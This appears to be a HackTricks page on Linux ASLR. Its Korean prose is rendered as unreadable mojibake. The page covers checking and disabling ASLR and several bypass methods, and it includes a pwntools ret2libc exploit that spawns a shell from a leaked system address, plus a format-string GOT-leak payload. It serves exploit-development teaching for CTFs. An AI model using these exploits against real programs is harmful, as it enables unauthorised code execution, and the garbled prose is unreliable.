# ASLR

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ì—ì„œ <strong>ì œë¡œë¶€í„° ì˜ì›…ê¹Œì§€ AWS í•´í‚¹ ë°°ìš°ê¸°</strong>!</summary>

ë‹¤ë¥¸ ë°©ë²•ìœ¼ë¡œ HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [Discord ê·¸ë£¹](https://discord.gg/hRep4RUj7f)** ë˜ëŠ” [í…”ë ˆê·¸ë¨ ê·¸ë£¹](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ë ¤ë©´ PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**Address Space Layout Randomization (ASLR)**ëŠ” ìš´ì˜ ì²´ì œì—ì„œ ì‚¬ìš©ë˜ëŠ” ë³´ì•ˆ ê¸°ìˆ ë¡œ, ì‹œìŠ¤í…œ ë° ì‘ìš© í”„ë¡œê·¸ë¨ í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‚¬ìš©í•˜ëŠ” **ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ë¬´ì‘ìœ„ë¡œ ë³€ê²½**í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•¨ìœ¼ë¡œì¨ íŠ¹ì • í”„ë¡œì„¸ìŠ¤ ë° ë°ì´í„°ì˜ ìœ„ì¹˜ë¥¼ ì˜ˆì¸¡í•˜ëŠ” ê²ƒì´ í›¨ì”¬ ì–´ë ¤ì›Œì§€ë©°, ìŠ¤íƒ, í™ ë° ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ ê°™ì€ íŠ¹ì • ìœ í˜•ì˜ ê³µê²©ì„ ì™„í™”ì‹œí‚µë‹ˆë‹¤.

### **ASLR ìƒíƒœ í™•ì¸**

Linux ì‹œìŠ¤í…œì—ì„œ ASLR ìƒíƒœë¥¼ **í™•ì¸**í•˜ë ¤ë©´ `/proc/sys/kernel/randomize_va_space` íŒŒì¼ì—ì„œ ê°’ì„ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ íŒŒì¼ì— ì €ì¥ëœ ê°’ì€ ì ìš©ë˜ëŠ” ASLR ìœ í˜•ì„ ê²°ì •í•©ë‹ˆë‹¤:

* **0**: ë¬´ì‘ìœ„í™” ì—†ìŒ. ëª¨ë“  ê²ƒì´ ì •ì ì…ë‹ˆë‹¤.
* **1**: ë³´ìˆ˜ì ì¸ ë¬´ì‘ìœ„í™”. ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬, ìŠ¤íƒ, mmap(), VDSO í˜ì´ì§€ê°€ ë¬´ì‘ìœ„í™”ë©ë‹ˆë‹¤.
* **2**: ì™„ì „í•œ ë¬´ì‘ìœ„í™”. ë³´ìˆ˜ì ì¸ ë¬´ì‘ìœ„í™”ì— ì˜í•´ ë¬´ì‘ìœ„í™”ëœ ìš”ì†Œì— ì¶”ê°€í•˜ì—¬ `brk()`ë¥¼ í†µí•´ ê´€ë¦¬ë˜ëŠ” ë©”ëª¨ë¦¬ê°€ ë¬´ì‘ìœ„í™”ë©ë‹ˆë‹¤.

ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•˜ì—¬ ASLR ìƒíƒœë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLR ë¹„í™œì„±í™”**

ASLRë¥¼ **ë¹„í™œì„±í™”**í•˜ë ¤ë©´ `/proc/sys/kernel/randomize_va_space`ì˜ ê°’ì„ **0**ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤. ASLRë¥¼ ë¹„í™œì„±í™”í•˜ëŠ” ê²ƒì€ ì¼ë°˜ì ìœ¼ë¡œ í…ŒìŠ¤íŠ¸ ë˜ëŠ” ë””ë²„ê¹… ì‹œë‚˜ë¦¬ì˜¤ ì´ì™¸ì—ëŠ” ê¶Œì¥ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ë‹¤ìŒì€ ë¹„í™œì„±í™”í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
ASLRë¥¼ ì‹¤í–‰ ì¤‘ì— ë¹„í™œì„±í™”í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤:
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLR í™œì„±í™”**

ASLRì„ **í™œì„±í™”**í•˜ë ¤ë©´ `/proc/sys/kernel/randomize_va_space` íŒŒì¼ì— **2** ê°’ì„ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ ë£¨íŠ¸ ê¶Œí•œì´ í•„ìš”í•©ë‹ˆë‹¤. ì „ì²´ ë¬´ì‘ìœ„í™”ë¥¼ í™œì„±í™”í•˜ë ¤ë©´ ë‹¤ìŒ ëª…ë ¹ì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **ë¶€íŒ… ê°„ ì§€ì†ì„±**

`echo` ëª…ë ¹ìœ¼ë¡œ ë§Œë“  ë³€ê²½ ì‚¬í•­ì€ ì¼ì‹œì ì´ë©° ì¬ë¶€íŒ…ì‹œ ì´ˆê¸°í™”ë©ë‹ˆë‹¤. ë³€ê²½ ì‚¬í•­ì„ ì§€ì†ì ìœ¼ë¡œ ìœ ì§€í•˜ë ¤ë©´ `/etc/sysctl.conf` íŒŒì¼ì„ í¸ì§‘í•˜ì—¬ ë‹¤ìŒ ì¤„ì„ ì¶”ê°€í•˜ê±°ë‚˜ ìˆ˜ì •í•´ì•¼ í•©ë‹ˆë‹¤:
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
`/etc/sysctl.conf` íŒŒì¼ì„ í¸ì§‘í•œ í›„ ë‹¤ìŒì„ ì‚¬ìš©í•˜ì—¬ ë³€ê²½ ì‚¬í•­ì„ ì ìš©í•˜ì‹­ì‹œì˜¤:
```bash
sudo sysctl -p
```
ì´ë ‡ê²Œ í•˜ë©´ ASLR ì„¤ì •ì´ ë‹¤ì‹œ ë¶€íŒ…ë˜ì–´ë„ ìœ ì§€ë©ë‹ˆë‹¤.

## **ìš°íšŒ ë°©ë²•**

### 32ë¹„íŠ¸ ë¬´ì°¨ë³„ ëŒ€ì…

PaXëŠ” í”„ë¡œì„¸ìŠ¤ ì£¼ì†Œ ê³µê°„ì„ **3 ê·¸ë£¹**ìœ¼ë¡œ ë‚˜ëˆ•ë‹ˆë‹¤:

* **ì½”ë“œì™€ ë°ì´í„°** (ì´ˆê¸°í™”ëœ ë° ì´ˆê¸°í™”ë˜ì§€ ì•Šì€): `.text`, `.data`, ë° `.bss` â€”> `delta_exec` ë³€ìˆ˜ì—ì„œ **16ë¹„íŠ¸**ì˜ ì—”íŠ¸ë¡œí”¼. ì´ ë³€ìˆ˜ëŠ” ê° í”„ë¡œì„¸ìŠ¤ë§ˆë‹¤ ë¬´ì‘ìœ„ë¡œ ì´ˆê¸°í™”ë˜ë©° ì´ˆê¸° ì£¼ì†Œì— ì¶”ê°€ë©ë‹ˆë‹¤.
* `mmap()`ì— ì˜í•´ í• ë‹¹ëœ **ë©”ëª¨ë¦¬** ë° **ê³µìœ  ë¼ì´ë¸ŒëŸ¬ë¦¬** â€”> **16ë¹„íŠ¸**, `delta_mmap`ì´ë¼ê³  í•¨.
* **ìŠ¤íƒ** â€”> **24ë¹„íŠ¸**, `delta_stack`ì´ë¼ê³  í•¨. ê·¸ëŸ¬ë‚˜ ì‹¤ì œë¡œ **11ë¹„íŠ¸**ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤ (10ë²ˆì§¸ë¶€í„° 20ë²ˆì§¸ ë°”ì´íŠ¸ê¹Œì§€ í¬í•¨), **16ë°”ì´íŠ¸**ì— ì •ë ¬ë¨ â€”> ì´ë¡œ ì¸í•´ **524,288ê°œì˜ ê°€ëŠ¥í•œ ì‹¤ì œ ìŠ¤íƒ ì£¼ì†Œ**ê°€ ìƒì„±ë©ë‹ˆë‹¤.

ì´ì „ ë°ì´í„°ëŠ” 32ë¹„íŠ¸ ì‹œìŠ¤í…œì„ ìœ„í•œ ê²ƒì´ë©° ìµœì¢… ì—”íŠ¸ë¡œí”¼ ê°ì†Œë¡œ ì¸í•´ ASLRì„ ìš°íšŒí•˜ì—¬ ê³µê²©ì´ ì„±ê³µì ìœ¼ë¡œ ì™„ë£Œë  ë•Œê¹Œì§€ ì‹¤í–‰ì„ ë‹¤ì‹œ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### ë¬´ì°¨ë³„ ëŒ€ì… ì•„ì´ë””ì–´:

* **ì‰˜ì½”ë“œ ì•ì— í° NOP ìŠ¬ë ˆë“œë¥¼ í˜¸ìŠ¤íŒ…í• ë§Œí¼ ì¶©ë¶„í•œ ì˜¤ë²„í”Œë¡œìš°ê°€ ìˆë‹¤ë©´**, ìŠ¤íƒ ì£¼ì†Œë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•˜ì—¬ íë¦„ì´ **NOP ìŠ¬ë ˆë“œì˜ ì¼ë¶€ë¥¼ ê±´ë„ˆë›°ë„ë¡** í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ì˜¤ë²„í”Œë¡œìš°ê°€ ê·¸ë¦¬ í¬ì§€ ì•Šê³  ê³µê²©ì„ ë¡œì»¬ì—ì„œ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê²½ìš°, **í™˜ê²½ ë³€ìˆ˜ì— NOP ìŠ¬ë ˆë“œì™€ ì‰˜ì½”ë“œë¥¼ ì¶”ê°€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ê³µê²©ì´ ë¡œì»¬ì¸ ê²½ìš°, libcì˜ ë² ì´ìŠ¤ ì£¼ì†Œë¥¼ ë¬´ì°¨ë³„ ëŒ€ì…í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤ (32ë¹„íŠ¸ ì‹œìŠ¤í…œì— ìœ ìš©í•¨):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* ì›ê²© ì„œë²„ë¥¼ ê³µê²©í•  ë•Œ, `libc` í•¨ìˆ˜ `usleep`ì˜ ì£¼ì†Œë¥¼ **10(ì˜ˆë¥¼ ë“¤ì–´)ìœ¼ë¡œ ì „ë‹¬í•˜ì—¬ **`burte-force** ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì„œë²„ê°€ ì‘ë‹µí•˜ëŠ” ë° **10ì´ˆ ë” ê±¸ë¦°ë‹¤ë©´**, ì´ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì°¾ì€ ê²ƒì…ë‹ˆë‹¤.

{% hint style="success" %}
64ë¹„íŠ¸ ì‹œìŠ¤í…œì—ì„œ ì—”íŠ¸ë¡œí”¼ê°€ í›¨ì”¬ ë†’ì•„ ì´ê²ƒì€ ë¶ˆê°€ëŠ¥í•©ë‹ˆë‹¤.
{% endhint %}

### ë¡œì»¬ ì •ë³´ (`/proc/[pid]/stat`)

í”„ë¡œì„¸ìŠ¤ì˜ **`/proc/[pid]/stat`** íŒŒì¼ì€ í•­ìƒ ëˆ„êµ¬ë‚˜ ì½ì„ ìˆ˜ ìˆìœ¼ë©° **ë‹¤ìŒê³¼ ê°™ì€** í¥ë¯¸ë¡œìš´ ì •ë³´ë¥¼ í¬í•¨í•©ë‹ˆë‹¤:

* **startcode** ë° **endcode**: **ë°”ì´ë„ˆë¦¬ì˜ TEXT**ì™€ ê´€ë ¨ëœ ìœ„ìª½ ë° ì•„ë˜ìª½ ì£¼ì†Œ
* **startstack**: **ìŠ¤íƒ**ì˜ ì‹œì‘ ì£¼ì†Œ
* **start\_data** ë° **end\_data**: **BSS**ê°€ ìˆëŠ” ìœ„ìª½ ë° ì•„ë˜ìª½ ì£¼ì†Œ
* **kstkesp** ë° **kstkeip**: í˜„ì¬ **ESP** ë° **EIP** ì£¼ì†Œ
* **arg\_start** ë° **arg\_end**: **cli ì¸ìˆ˜**ê°€ ìˆëŠ” ìœ„ìª½ ë° ì•„ë˜ìª½ ì£¼ì†Œ
* **env\_start** ë° **env\_end**: **í™˜ê²½ ë³€ìˆ˜**ê°€ ìˆëŠ” ìœ„ìª½ ë° ì•„ë˜ìª½ ì£¼ì†Œ

ë”°ë¼ì„œ, ê³µê²©ìê°€ ì·¨ì•½í•œ ì´ì§„ íŒŒì¼ì´ ìˆëŠ” ì»´í“¨í„°ì™€ ë™ì¼í•œ ìœ„ì¹˜ì— ìˆê³ , í•´ë‹¹ ì´ì§„ íŒŒì¼ì´ ì›ì‹œ ì¸ìˆ˜ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ê¸°ëŒ€í•˜ì§€ ì•Šì§€ë§Œ ì´ íŒŒì¼ì„ ì½ì€ í›„ **ìƒì„±í•  ìˆ˜ ìˆëŠ” ë‹¤ë¥¸ ì…ë ¥ì—ì„œ ì˜¤ë²„í”Œë¡œìš°ê°€ ë°œìƒí•œë‹¤ë©´** ê³µê²©ìëŠ” **ì´ íŒŒì¼ì—ì„œ ì¼ë¶€ ì£¼ì†Œë¥¼ ì–»ê³  í•´ë‹¹ ì£¼ì†Œë¡œë¶€í„° ê³µê²©ì„ ìœ„í•œ ì˜¤í”„ì…‹ì„ êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

{% hint style="success" %}
ì´ íŒŒì¼ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html)ì—ì„œ `/proc/pid/stat`ì„ ê²€ìƒ‰í•˜ì—¬ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### Leakì´ ìˆëŠ” ê²½ìš°

* **ë„ì „ ê³¼ì œëŠ” Leakì„ ì œê³µí•˜ëŠ” ê²ƒì…ë‹ˆë‹¤**

Leakì´ ì£¼ì–´ì§„ ê²½ìš° (ì‰¬ìš´ CTF ë„ì „ ê³¼ì œ), í•´ë‹¹ Leakì—ì„œ ì˜¤í”„ì…‹ì„ ê³„ì‚°í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆë¥¼ ë“¤ì–´, ê³µê²©í•˜ëŠ” ì‹œìŠ¤í…œì—ì„œ ì‚¬ìš©ë˜ëŠ” ì •í™•í•œ libc ë²„ì „ì„ ì•Œê³  ìˆë‹¤ê³  ê°€ì •). ì´ ì˜ˆì œ exploitì€ [**ì—¬ê¸°ì˜ ì˜ˆì œ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ì—ì„œ ì¶”ì¶œë˜ì—ˆìŠµë‹ˆë‹¤ (ìì„¸í•œ ë‚´ìš©ì€ í•´ë‹¹ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì‹­ì‹œì˜¤):
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ì•…ìš©í•˜ì—¬ **ret2plt**ë¥¼ ì´ìš©í•˜ì—¬ libcì—ì„œ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

ret2pltì™€ ë§ˆì°¬ê°€ì§€ë¡œ í¬ë§· ë¬¸ìì—´ ì·¨ì•½ì ì„ í†µí•´ ì„ì˜ì˜ ì½ê¸°ê°€ ê°€ëŠ¥í•˜ë©´ **GOT**ì—ì„œ **libc í•¨ìˆ˜**ì˜ ì£¼ì†Œë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ìŒì€ [**ì—¬ê¸°ì—ì„œì˜ ì˜ˆì œ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)ì…ë‹ˆë‹¤:
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
ë‹¤ìŒ ìœ„ì¹˜ì—ì„œ Format Strings ì„ì˜ ì½ê¸°ì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

ìŠ¤íƒ ë‚´ë¶€ ì£¼ì†Œë¥¼ ì•…ìš©í•˜ì—¬ ASLRì„ ìš°íšŒí•˜ë ¤ê³  ì‹œë„í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}
